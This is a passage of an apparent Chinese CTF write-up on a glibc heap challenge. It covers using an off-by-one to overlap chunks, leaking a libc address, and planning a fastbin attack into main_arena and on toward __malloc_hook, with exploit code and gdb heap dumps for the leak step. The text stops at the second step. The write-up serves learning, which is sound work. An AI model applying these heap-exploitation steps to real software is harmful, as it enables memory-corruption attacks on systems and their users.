**学习过程中，参考了以下博文:**

https://blog.csdn.net/qq_33528164/article/details/79951156   这篇我觉得泄露地址的方法最简便，但是最后无法getshell，我的exp是在他的基础下写的。

https://www.jianshu.com/p/959d4b7b5af1

https://www.jianshu.com/p/95b30d754577

**基本利用思路：**

1. 利用了offbyone，修改处于inuse状态的chunk的size，造成chunk overlap来泄露地址，注意free的时候会检查下一个chunk的size的prev_inuse位是否为1.然后通过fastbin attack完成攻击。
2. 由于__malloc_hook附近没有可用的fake_size。上述的博文的利用思路是利用fastbin attack先将chunk分配到main_arena里.方法是利用chunk overlap，将处于fastbin的chunk的fd修改为0x61,再malloc一个size为0x60的chunk，这时fastbin里的内容就会变成0x61，这样就可以使用fastbin attack，将堆分配到main_arena.
3. 然后修改top_chunk到__malloc_hook附近。再次申请chunk即可得到malloc_hook附近的chunk。但是利用过程出现了很多上述博文没有出现的问题。一步一步的调试最终解决问题。下面记录调试过程。

**详细调试过程：**

复现环境：ubuntu 16.04

1. 泄露地址：

```
alloc(0x48) #0
alloc(0x48) #1
alloc(0x48) #2
alloc(0x48) #3 ；防止被top chunk合并
update(0, 0x49, "A"*0x48 + "\xa1") #修改chunk1的size为0xa1
delete(1)   #1 ；free chunk1，chunk1被放入unsorted bin中
alloc(0x48) #1 ；再malloc 一个0x50大小的chunk，那么chunk1被切割，剩余部分放入unsorted bin，被写入地址。即chunk2的userdata部分被写入&main_arena+88
view(2)     #    泄露地址
p.recvuntil("Chunk[2]: ")
leak = u64(p.recv(8))
libc_base = leak - 0x58-libc.symbols["__malloc_hook"]-0x10
```
连续申请4个chunk后的heap布局如下：
```
0x555555757000 FASTBIN {  #chunk0
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757050 FASTBIN {  #chunk1
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570a0 FASTBIN {  #chunk2
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570f0 FASTBIN { #chunk3
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
修改chunk1的size为0xa1:
```
0x555555757050 PREV_INUSE {
  prev_size = 4702111234474983745, 
  size = 161, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
然后free chunk1,再alloc(0x48):
```
0x555555757050 FASTBIN {
  prev_size = 4702111234474983745, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570a0 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, #原本chunk2里就有了地址，再view即可泄露
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

2. dup to main_arena:
